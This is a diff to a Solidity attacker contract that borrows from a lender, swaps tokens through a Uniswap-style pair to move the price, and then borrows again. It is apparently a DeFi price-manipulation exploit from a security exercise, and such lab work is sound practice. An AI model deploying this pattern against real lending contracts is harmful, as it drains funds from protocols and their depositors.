@@ -16,8 +16,6 @@ contract Taker {
         uniswapPair = uniswapPairAddress;
         lender = _lender;
 
-        console.log(msg.value / 10 ** 18);
-
         (bool success1, bytes memory result1) = lender.call{value: msg.value}(
             abi.encodeWithSignature(
                 "borrow(uint256,address)",
@@ -33,10 +31,19 @@ contract Taker {
         abi.encodeWithSignature(
             "tokenToEthSwapInput(uint256,uint256,uint256)",
             token.balanceOf(address(this)),
-            0,
+            10 ** 18,
             block.timestamp * 2
             )
         );
         console.log(success2);
+
+        (bool success3, bytes memory result3) = lender.call{value: msg.value}(
+            abi.encodeWithSignature(
+                "borrow(uint256,address)",
+                2 * 10 ** 18,
+                address(this)
+            )
+        );
+        console.log(success3);
     }
 } 
